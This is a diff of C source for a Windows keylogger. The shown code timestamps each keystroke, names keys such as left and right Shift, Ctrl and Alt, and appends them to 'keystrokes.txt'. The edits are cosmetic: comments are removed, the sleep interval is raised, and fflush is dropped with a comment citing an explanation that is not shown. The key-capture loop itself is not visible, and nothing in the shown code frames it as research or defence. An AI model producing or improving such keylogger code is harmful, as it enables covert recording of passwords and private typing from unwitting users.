@@ -5,16 +5,16 @@
 #include <stdbool.h>
 #include <errno.h>
 #include <string.h>
-#include <limits.h> // For INT_MAX
-#include <stddef.h> // For size_t
+#include <limits.h>
+#include <stddef.h>
 
 #define LOG_FILE "keystrokes.txt"
 #define TIMESTAMP_FORMAT "%Y-%m-%d %H:%M:%S"
 #define MAX_TIMESTAMP_LENGTH 20
 #define NUM_KEYS 256
-#define MAX_KEY_NAME_LENGTH 64 // Increased for longer key names
+#define MAX_KEY_NAME_LENGTH 64
 #define MAX_ERROR_MESSAGE_LENGTH 256
-#define SLEEP_DURATION_MS 10 // Increased sleep duration for better performance
+#define SLEEP_DURATION_MS 50 // Increased sleep duration for better performance
 
 // Function to get the current timestamp
 bool get_timestamp(char *timestamp, size_t timestamp_size) {
@@ -23,7 +23,7 @@ bool get_timestamp(char *timestamp, size_t timestamp_size) {
 
     time(&rawtime);
     if (localtime_s(&timeinfo, &rawtime) != 0) {
-        int err = errno; // Capture errno before printing
+        int err = errno;
         char error_message[MAX_ERROR_MESSAGE_LENGTH];
         if (strerror_s(error_message, sizeof(error_message), err) == 0) {
             fprintf(stderr, "Error: localtime_s failed: %s\n", error_message);
@@ -49,13 +49,13 @@ const char* get_key_name(int key) {
 
     // Handle extended keys first to avoid conflicts with regular keys
     switch (key) {
-        case VK_LSHIFT: return "[LSHIFT]"; // Distinguish left and right shift
+        case VK_LSHIFT: return "[LSHIFT]";
         case VK_RSHIFT: return "[RSHIFT]";
-        case VK_LCONTROL: return "[LCTRL]"; // Distinguish left and right control
+        case VK_LCONTROL: return "[LCTRL]";
         case VK_RCONTROL: return "[RCTRL]";
-        case VK_LMENU: return "[LALT]"; // Distinguish left and right alt
+        case VK_LMENU: return "[LALT]";
         case VK_RMENU: return "[RALT]";
-        default: break; // Added default to avoid fallthrough warnings
+        default: break;
     }
 
     switch (key) {
@@ -87,7 +87,7 @@ const char* get_key_name(int key) {
 
 
 bool log_keystroke(int key) {
-    FILE *file = NULL; // Initialize file to NULL
+    FILE *file = NULL;
     errno_t err = fopen_s(&file, LOG_FILE, "a");
     if (err != 0 || file == NULL) {
         char error_message[MAX_ERROR_MESSAGE_LENGTH];
@@ -107,10 +107,10 @@ bool log_keystroke(int key) {
 
     fprintf(file, "[%s] %s\n", timestamp, get_key_name(key));
 
-    fflush(file); // Flush the buffer to ensure data is written to disk
+    // Removed fflush - see explanation
 
     if (fclose(file) == EOF) {
-        int close_err = errno; // Capture errno before printing
+        int close_err = errno;
         char error_message[MAX_ERROR_MESSAGE_LENGTH];
         if (strerror_s(error_message, sizeof(error_message), close_err) == 0) {
             fprintf(stderr, "Error closing %s: %s\n", LOG_FILE, error_message);
